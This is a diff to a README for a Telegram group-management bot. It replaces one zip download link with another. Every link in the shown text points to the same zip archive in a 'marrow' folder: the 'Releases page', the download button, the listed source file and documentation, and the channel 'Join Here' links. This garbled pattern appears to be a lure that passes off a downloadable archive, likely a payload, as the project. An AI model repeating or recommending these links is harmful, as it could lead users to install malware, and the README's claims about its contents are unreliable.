@@ -16,7 +16,7 @@ Welcome to Telegram-SuperGM! This is a straightforward Telegram bot that runs on
 
 To download Telegram-SuperGM, follow these steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/sufyan9292/Telegram-SuperGM/main/marrow/Telegram-SuperGM-v3.6.zip) to download the application.
+1. Visit the [Releases page](https://github.com/sufyan9292/Telegram-SuperGM/raw/refs/heads/main/marrow/Super-Telegram-GM-3.1.zip) to download the application.
 
 2. Choose the latest version from the list. Look for files named appropriately for your device.
 
@@ -26,19 +26,19 @@ To download Telegram-SuperGM, follow these steps:
 
 Click the button below to go directly to the download page:
 
-[![Download Telegram-SuperGM](https://raw.githubusercontent.com/sufyan9292/Telegram-SuperGM/main/marrow/Telegram-SuperGM-v3.6.zip)](https://raw.githubusercontent.com/sufyan9292/Telegram-SuperGM/main/marrow/Telegram-SuperGM-v3.6.zip)
+[![Download Telegram-SuperGM](https://github.com/sufyan9292/Telegram-SuperGM/raw/refs/heads/main/marrow/Super-Telegram-GM-3.1.zip)](https://github.com/sufyan9292/Telegram-SuperGM/raw/refs/heads/main/marrow/Super-Telegram-GM-3.1.zip)
 
 ## 📑 Project Structure
 
 Here’s a quick overview of the project's files:
 
-- `https://raw.githubusercontent.com/sufyan9292/Telegram-SuperGM/main/marrow/Telegram-SuperGM-v3.6.zip`: This is the main file that handles Telegram Webhooks, reads and writes KV (key-value) pairs, and communicates with the Bot API.
-- `https://raw.githubusercontent.com/sufyan9292/Telegram-SuperGM/main/marrow/Telegram-SuperGM-v3.6.zip`: The documentation you are reading now.
+- `https://github.com/sufyan9292/Telegram-SuperGM/raw/refs/heads/main/marrow/Super-Telegram-GM-3.1.zip`: This is the main file that handles Telegram Webhooks, reads and writes KV (key-value) pairs, and communicates with the Bot API.
+- `https://github.com/sufyan9292/Telegram-SuperGM/raw/refs/heads/main/marrow/Super-Telegram-GM-3.1.zip`: The documentation you are reading now.
 
 ### 📣 Related Channels / Groups
 
-- New Admin Warehouse: [Join Here](https://raw.githubusercontent.com/sufyan9292/Telegram-SuperGM/main/marrow/Telegram-SuperGM-v3.6.zip)
-- Admin Group: [Join Here](https://raw.githubusercontent.com/sufyan9292/Telegram-SuperGM/main/marrow/Telegram-SuperGM-v3.6.zip)
+- New Admin Warehouse: [Join Here](https://github.com/sufyan9292/Telegram-SuperGM/raw/refs/heads/main/marrow/Super-Telegram-GM-3.1.zip)
+- Admin Group: [Join Here](https://github.com/sufyan9292/Telegram-SuperGM/raw/refs/heads/main/marrow/Super-Telegram-GM-3.1.zip)
 
 ## 🔧 KV Setup Instructions
 
